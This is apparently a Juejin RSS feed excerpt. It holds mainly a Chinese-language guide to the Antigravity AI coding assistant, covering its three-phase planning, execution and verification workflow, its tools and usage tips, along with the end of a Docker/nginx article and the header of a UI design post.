CMD [<span class="hljs-string">"nginx"</span>, <span class="hljs-string">"-g"</span>, <span class="hljs-string">"daemon off;"</span>]
</code></pre>
<p>需要注意的是</p>
<pre><code class="hljs language-bash" lang="bash">COPY --from=build /app/build /usr/share/nginx/html
</code></pre>
<p>--from build , 这个 build 就是 <code>FROM node:20-slim as build</code> 中，node.js 镜像的别名。意思是把这个镜像中 /app/build 目录下的文件复制到 nginx:alpine 镜像的 /usr/share/nginx/html 文件夹下。</p>
<h2 data-id="heading-26">欢迎加入交流群</h2>
<p>欢迎大家一起进群讨论前端全栈技术和 ai agent ，一起进步！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Antigravity：下一代 AI 编程助手完全指南]]></title>    <link>https://juejin.cn/post/7581423932612984872</link>    <guid>https://juejin.cn/post/7581423932612984872</guid>    <pubDate>2025-12-09T02:53:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932612984872" data-draft-id="7581386627676913704" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Antigravity：下一代 AI 编程助手完全指南"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2025-12-09T02:53:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只爱吃糖的小羊"/> <meta itemprop="url" content="https://juejin.cn/user/1865251025859358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Antigravity：下一代 AI 编程助手完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1865251025859358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只爱吃糖的小羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:53:13.000Z" title="Tue Dec 09 2025 02:53:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Antigravity：下一代 AI 编程助手完全指南</h2>
<blockquote>
<p>Antigravity 是由 Google DeepMind 团队开发的强大 AI 编程助手，为开发者提供智能化的代码编写、调试和优化体验。</p>
</blockquote>
<h3 data-id="heading-1">简介</h3>
<p>Antigravity 不仅仅是一个代码补全工具，它是一个能够理解你的意图、主动解决问题的智能编程伙伴。通过先进的 AI 技术，Antigravity 可以帮助你完成从项目规划到代码实现、测试验证的完整开发流程。</p>
<h3 data-id="heading-2">核心特性</h3>
<h4 data-id="heading-3">1. 智能任务管理</h4>
<p>Antigravity 采用任务驱动的工作方式，将复杂的开发任务分解为可管理的子任务：</p>
<ul>
<li><strong>自动任务分解</strong>：将用户需求自动分解为具体的实施步骤</li>
<li><strong>进度追踪</strong>：实时显示任务执行状态和完成进度</li>
<li><strong>动态调整</strong>：根据实际情况智能调整执行计划</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 示例：任务自动分解</span>
用户需求：添加用户登录功能

Antigravity 自动生成：
<span class="hljs-bullet">-</span> [ ] 设计登录页面 UI
<span class="hljs-bullet">-</span> [ ] 实现前端表单验证
<span class="hljs-bullet">-</span> [ ] 创建后端 API 接口
<span class="hljs-bullet">-</span> [ ] 添加身份认证逻辑
<span class="hljs-bullet">-</span> [ ] 编写单元测试
<span class="hljs-bullet">-</span> [ ] 进行集成测试
</code></pre>
<h4 data-id="heading-4">2. 三阶段工作模式</h4>
<p>Antigravity 采用科学的三阶段工作流程，确保代码质量：</p>
<h5 data-id="heading-5">PLANNING（规划阶段）</h5>
<ul>
<li>深入理解需求，分析代码库结构</li>
<li>生成详细的实施计划（implementation_plan.md）</li>
<li>识别潜在风险和技术难点</li>
<li>等待用户审核批准后再执行</li>
</ul>
<h5 data-id="heading-6">EXECUTION（执行阶段）</h5>
<ul>
<li>按照计划实施代码修改</li>
<li>自动处理文件依赖关系</li>
<li>保持代码风格一致性</li>
<li>发现问题时可返回 PLANNING 阶段</li>
</ul>
<h5 data-id="heading-7">VERIFICATION（验证阶段）</h5>
<ul>
<li>运行自动化测试</li>
<li>验证功能正确性</li>
<li>生成演示文档（walkthrough.md）</li>
<li>提供可视化的验证结果</li>
</ul>
<h4 data-id="heading-8">3. 强大的代码编辑能力</h4>
<h5 data-id="heading-9">精确的代码修改</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Antigravity 可以精确定位并修改代码</span>
<span class="hljs-comment">// 使用 replace_file_content 进行单块修改</span>
<span class="hljs-comment">// 使用 multi_replace_file_content 进行多处修改</span>

<span class="hljs-comment">// 示例：添加新功能</span>
<span class="hljs-comment">// 原代码</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLogin</span>(<span class="hljs-params">username: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(username);
}

<span class="hljs-comment">// Antigravity 修改后</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLogin</span>(<span class="hljs-params">username: <span class="hljs-built_in">string</span>, password: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">if</span> (!username || !password) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'用户名和密码不能为空'</span>);
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">authenticateUser</span>(username, password);
}
</code></pre>
<h5 data-id="heading-10">智能代码分析</h5>
<ul>
<li>自动识别代码结构和依赖关系</li>
<li>理解函数、类、模块的作用域</li>
<li>支持多种编程语言</li>
</ul>
<h4 data-id="heading-11">4. 文件系统操作</h4>
<p>Antigravity 提供完整的文件操作能力：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查找文件</span>
find_by_name - 搜索特定文件或目录

<span class="hljs-comment"># 查看文件</span>
view_file - 查看文件内容
view_file_outline - 查看文件结构大纲
view_code_item - 查看特定函数或类

<span class="hljs-comment"># 搜索内容</span>
grep_search - 在文件中搜索特定内容

<span class="hljs-comment"># 编辑文件</span>
write_to_file - 创建新文件
replace_file_content - 修改现有文件
multi_replace_file_content - 批量修改
</code></pre>
<h4 data-id="heading-12">5. 命令行集成</h4>
<p>直接在工作流中执行终端命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Antigravity 可以执行各种命令</span>
npm install          <span class="hljs-comment"># 安装依赖</span>
npm run dev         <span class="hljs-comment"># 启动开发服务器</span>
npm <span class="hljs-built_in">test</span>            <span class="hljs-comment"># 运行测试</span>
git status          <span class="hljs-comment"># 查看 Git 状态</span>
</code></pre>
<h4 data-id="heading-13">6. 浏览器自动化</h4>
<p>支持浏览器操作和测试：</p>
<ul>
<li>自动打开网页并进行交互</li>
<li>捕获屏幕截图和录制视频</li>
<li>验证 UI 功能和用户体验</li>
<li>生成可视化的测试报告</li>
</ul>
<h4 data-id="heading-14">7. AI 图像生成</h4>
<p>内置图像生成能力：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 为你的项目生成所需的图像资源</span>
<span class="hljs-title function_">generate_image</span>({
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">"现代化的登录页面背景图，科技感，蓝色渐变"</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"login_bg"</span>
})
</code></pre>
<h3 data-id="heading-15">使用指南</h3>
<h4 data-id="heading-16">快速开始</h4>
<h5 data-id="heading-17">1. 基础使用</h5>
<p>只需用自然语言描述你的需求：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"帮我创建一个 React 组件，用于显示用户个人信息"</span>
</code></pre>
<p>Antigravity 会自动：</p>
<ul>
<li>分析需求</li>
<li>创建组件文件</li>
<li>编写代码</li>
<li>添加样式</li>
<li>生成示例用法</li>
</ul>
<h5 data-id="heading-18">2. 复杂项目开发</h5>
<p>对于复杂任务，Antigravity 会进入任务模式：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"我想为网站添加一个博客系统，包括文章列表、详情页和评论功能"</span>
</code></pre>
<p>Antigravity 的工作流程：</p>
<ol>
<li>
<p><strong>PLANNING 阶段</strong></p>
<ul>
<li>创建 <code>implementation_plan.md</code></li>
<li>列出需要修改的文件</li>
<li>说明技术方案</li>
<li>请求用户审核</li>
</ul>
</li>
<li>
<p><strong>EXECUTION 阶段</strong></p>
<ul>
<li>创建路由配置</li>
<li>实现文章列表组件</li>
<li>实现文章详情组件</li>
<li>添加评论系统</li>
<li>配置 API 接口</li>
</ul>
</li>
<li>
<p><strong>VERIFICATION 阶段</strong></p>
<ul>
<li>运行开发服务器</li>
<li>测试各个功能</li>
<li>生成 <code>walkthrough.md</code></li>
<li>提供截图和录屏</li>
</ul>
</li>
</ol>
<h4 data-id="heading-19">高级技巧</h4>
<h5 data-id="heading-20">1. 提供上下文信息</h5>
<p>为了获得更好的结果，你可以：</p>
<pre><code class="hljs language-css" lang="css">"参考现有的 <span class="hljs-selector-tag">Header</span> 组件的样式，创建一个 <span class="hljs-selector-tag">Footer</span> 组件"
</code></pre>
<p>Antigravity 会自动：</p>
<ul>
<li>查找 Header 组件</li>
<li>分析其样式和结构</li>
<li>创建风格一致的 Footer 组件</li>
</ul>
<h5 data-id="heading-21">2. 迭代式开发</h5>
<pre><code class="hljs language-arduino" lang="arduino">用户：<span class="hljs-string">"创建一个计数器组件"</span>
Antigravity：[创建基础组件]

用户：<span class="hljs-string">"添加重置按钮"</span>
Antigravity：[在现有组件上添加功能]

用户：<span class="hljs-string">"使用 Redux 管理状态"</span>
Antigravity：[重构为使用 Redux]
</code></pre>
<h5 data-id="heading-22">3. 代码审查和优化</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"请审查 UserProfile.tsx 文件，优化性能并添加错误处理"</span>
</code></pre>
<p>Antigravity 会：</p>
<ul>
<li>分析代码质量</li>
<li>识别性能瓶颈</li>
<li>添加错误边界</li>
<li>优化渲染逻辑</li>
<li>提供改进建议</li>
</ul>
<h5 data-id="heading-23">4. 调试和问题修复</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"登录功能有问题，用户点击提交按钮后没有反应"</span>
</code></pre>
<p>Antigravity 会：</p>
<ul>
<li>检查相关代码</li>
<li>识别可能的问题</li>
<li>提出修复方案</li>
<li>实施修改</li>
<li>验证修复效果</li>
</ul>
<h3 data-id="heading-24">实战示例</h3>
<h4 data-id="heading-25">示例 1：创建响应式导航栏</h4>
<p><strong>用户请求：</strong></p>
<pre><code class="hljs">创建一个现代化的响应式导航栏，在移动端显示汉堡菜单
</code></pre>
<p><strong>Antigravity 执行流程：</strong></p>
<ol>
<li>
<p><strong>规划阶段</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 实施计划</span>

<span class="hljs-section">## 变更内容</span>

<span class="hljs-section">### 新建文件</span>
<span class="hljs-bullet">-</span> src/components/Navbar/Navbar.tsx
<span class="hljs-bullet">-</span> src/components/Navbar/Navbar.less

<span class="hljs-section">## 技术方案</span>
<span class="hljs-bullet">-</span> 使用 React Hooks 管理菜单状态
<span class="hljs-bullet">-</span> CSS Media Queries 实现响应式
<span class="hljs-bullet">-</span> 平滑动画过渡效果
</code></pre>
</li>
<li>
<p><strong>执行阶段</strong></p>
<ul>
<li>创建组件文件</li>
<li>实现响应式逻辑</li>
<li>添加动画效果</li>
<li>集成到主应用</li>
</ul>
</li>
<li>
<p><strong>验证阶段</strong></p>
<ul>
<li>在不同屏幕尺寸下测试</li>
<li>提供演示截图</li>
<li>生成使用文档</li>
</ul>
</li>
</ol>
<h4 data-id="heading-26">示例 2：添加暗黑模式</h4>
<p><strong>用户请求：</strong></p>
<pre><code class="hljs">为整个网站添加暗黑模式切换功能
</code></pre>
<p><strong>Antigravity 工作过程：</strong></p>
<ol>
<li>分析现有样式系统</li>
<li>创建主题切换 Context</li>
<li>修改所有组件支持主题</li>
<li>添加切换按钮</li>
<li>持久化用户偏好</li>
<li>测试所有页面</li>
</ol>
<h4 data-id="heading-27">示例 3：性能优化</h4>
<p><strong>用户请求：</strong></p>
<pre><code class="hljs">优化首页加载速度，减少包体积
</code></pre>
<p><strong>Antigravity 优化方案：</strong></p>
<ul>
<li>代码分割和懒加载</li>
<li>图片优化和压缩</li>
<li>移除未使用的依赖</li>
<li>实施缓存策略</li>
<li>提供性能报告</li>
</ul>
<h3 data-id="heading-28">最佳实践</h3>
<h4 data-id="heading-29">1. 清晰的需求描述</h4>
<p>❌ <strong>不推荐：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"改一下登录页面"</span>
</code></pre>
<p>✅ <strong>推荐：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"修改登录页面，添加'记住我'选项和'忘记密码'链接，
并改进表单验证，在用户输入时实时显示错误提示"</span>
</code></pre>
<h4 data-id="heading-30">2. 提供必要的上下文</h4>
<p>❌ <strong>不推荐：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"添加一个列表组件"</span>
</code></pre>
<p>✅ <strong>推荐：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"参考现有的 UserList 组件风格，创建一个 ArticleList 组件，
用于显示博客文章，包括标题、摘要、发布时间和分类"</span>
</code></pre>
<h4 data-id="heading-31">3. 分步骤进行复杂任务</h4>
<p>对于大型功能，建议分阶段完成：</p>
<pre><code class="hljs language-arduino" lang="arduino">第一步：<span class="hljs-string">"创建博客文章的数据模型和 API 接口"</span>
第二步：<span class="hljs-string">"实现文章列表页面"</span>
第三步：<span class="hljs-string">"实现文章详情页面"</span>
第四步：<span class="hljs-string">"添加文章搜索和筛选功能"</span>
</code></pre>
<h4 data-id="heading-32">4. 及时审查和反馈</h4>
<p>当 Antigravity 请求审查时：</p>
<ul>
<li>仔细检查实施计划</li>
<li>提出疑问和建议</li>
<li>确认后再继续执行</li>
</ul>
<h4 data-id="heading-33">5. 利用验证阶段</h4>
<p>在验证阶段：</p>
<ul>
<li>检查生成的演示文档</li>
<li>查看截图和录屏</li>
<li>手动测试关键功能</li>
<li>提出改进意见</li>
</ul>
<h3 data-id="heading-34">工作流程图示</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[用户提出需求] --&gt; B{任务复杂度}
    B --&gt;|简单| C[直接执行]
    B --&gt;|复杂| D[进入任务模式]
    
    D --&gt; E[PLANNING: 创建实施计划]
    E --&gt; F[用户审核]
    F --&gt;|需要修改| E
    F --&gt;|批准| G[EXECUTION: 实施代码]
    
    G --&gt; H{发现问题?}
    H --&gt;|是| E
    H --&gt;|否| I[VERIFICATION: 验证测试]
    
    I --&gt; J[生成演示文档]
    J --&gt; K[任务完成]
    
    C --&gt; K
</code></pre>
<h3 data-id="heading-35">常见问题</h3>
<h4 data-id="heading-36">Q: Antigravity 支持哪些编程语言？</h4>
<p>A: Antigravity 支持几乎所有主流编程语言，包括但不限于：</p>
<ul>
<li>JavaScript/TypeScript</li>
<li>Python</li>
<li>Java/Kotlin</li>
<li>Go</li>
<li>C/C++</li>
<li>Rust</li>
<li>PHP
等</li>
</ul>
<h4 data-id="heading-37">Q: 如何让 Antigravity 遵循项目的代码规范？</h4>
<p>A: Antigravity 会自动分析你的代码库，学习现有的代码风格和规范。你也可以明确指出：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"遵循项目现有的代码规范，使用 ESLint 配置的标准"</span>
</code></pre>
<h4 data-id="heading-38">Q: Antigravity 会破坏现有代码吗？</h4>
<p>A: Antigravity 非常谨慎：</p>
<ul>
<li>在修改前会先分析代码</li>
<li>只修改必要的部分</li>
<li>保持代码的完整性</li>
<li>你可以随时使用 Git 回滚</li>
</ul>
<h4 data-id="heading-39">Q: 如何让 Antigravity 运行测试？</h4>
<p>A: 直接请求即可：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"运行项目的测试套件，并修复失败的测试"</span>
</code></pre>
<h4 data-id="heading-40">Q: Antigravity 能处理多文件的复杂修改吗？</h4>
<p>A: 可以！Antigravity 擅长处理跨文件的修改：</p>
<ul>
<li>自动识别文件依赖</li>
<li>同步更新相关文件</li>
<li>保持代码一致性</li>
</ul>
<h3 data-id="heading-41">进阶功能</h3>
<h4 data-id="heading-42">1. 自定义工作流</h4>
<p>你可以在项目中创建 <code>.agent/workflows</code> 目录，定义自己的工作流程：</p>
<pre><code class="hljs language-markdown" lang="markdown">---
<span class="hljs-section">description: 部署到生产环境
---</span>

<span class="hljs-bullet">1.</span> 运行完整测试套件
<span class="hljs-bullet">2.</span> 构建生产版本
<span class="hljs-bullet">3.</span> 检查构建产物
<span class="hljs-bullet">4.</span> 部署到服务器
<span class="hljs-bullet">5.</span> 验证部署结果
</code></pre>
<h4 data-id="heading-43">2. 集成开发工具</h4>
<p>Antigravity 可以与你的开发工具无缝集成：</p>
<ul>
<li>Git 版本控制</li>
<li>npm/yarn 包管理</li>
<li>构建工具（Webpack, Vite 等）</li>
<li>测试框架（Jest, Vitest 等）</li>
<li>CI/CD 流程</li>
</ul>
<h4 data-id="heading-44">3. 知识库查询</h4>
<p>Antigravity 可以：</p>
<ul>
<li>搜索互联网获取最新信息</li>
<li>阅读文档和教程</li>
<li>参考开源项目</li>
<li>提供技术建议</li>
</ul>
<h3 data-id="heading-45">性能和限制</h3>
<h4 data-id="heading-46">性能特点</h4>
<ul>
<li><strong>快速响应</strong>：简单任务立即完成</li>
<li><strong>并行处理</strong>：可同时处理多个独立任务</li>
<li><strong>智能缓存</strong>：避免重复分析相同代码</li>
</ul>
<h4 data-id="heading-47">当前限制</h4>
<ul>
<li>单次文件查看限制为 800 行</li>
<li>不支持直接编辑某些文件格式（如 .ipynb）</li>
<li>需要网络连接访问外部资源</li>
</ul>
<h3 data-id="heading-48">总结</h3>
<p>Antigravity 是一个强大而智能的 AI 编程助手，它能够：</p>
<p>✅ <strong>理解你的需求</strong>：通过自然语言理解复杂的开发任务<br/>
✅ <strong>自主规划执行</strong>：智能分解任务并生成详细计划<br/>
✅ <strong>编写高质量代码</strong>：遵循最佳实践和项目规范<br/>
✅ <strong>验证和测试</strong>：确保代码质量和功能正确性<br/>
✅ <strong>持续学习</strong>：根据反馈不断改进</p>
<p>无论你是在开发新功能、修复 Bug、优化性能，还是重构代码，Antigravity 都能成为你得力的编程伙伴。</p>
<h3 data-id="heading-49">开始使用</h3>
<p>现在就开始使用 Antigravity，体验下一代 AI 辅助编程的强大功能吧！</p>
<hr/>
<p><strong>相关资源：</strong></p>
<ul>
<li>Google DeepMind 官方文档</li>
<li>Antigravity 社区论坛</li>
<li>示例项目和最佳实践</li>
</ul>
<p><strong>版本信息：</strong> 本指南基于 Antigravity 2024 版本编写</p>
<p><strong>最后更新：</strong> 2025-12-09</p>
<p><strong>欢迎访问我的个人网站: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhixiaohezi.com" target="_blank" title="https://hixiaohezi.com" ref="nofollow noopener noreferrer">hixiaohezi.com</a></strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52f724e4e8dd41a2ab0f139b8231169e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q54ix5ZCD57OW55qE5bCP576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853760&amp;x-signature=Dq0OxMxpKk2Q1uLPH2s4cqv8YiM%3D" alt="og-image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何让AI设计出Apple风格的顶级UI？]]></title>    <link>https://juejin.cn/post/7581423932612329512</link>    <guid>https://juejin.cn/post/7581423932612329512</guid>    <pubDate>2025-12-09T01:46:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932612329512" data-draft-id="7579892222608736291" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何让AI设计出Apple风格的顶级UI？"/> <meta itemprop="keywords" content="前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-09T01:46:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端九哥"/> <meta itemprop="url" content="https://juejin.cn/user/3659622444970574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何让AI设计出Apple风格的顶级UI？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3659622444970574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端九哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T01:46:02.000Z" title="Tue Dec 09 2025 01:46:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
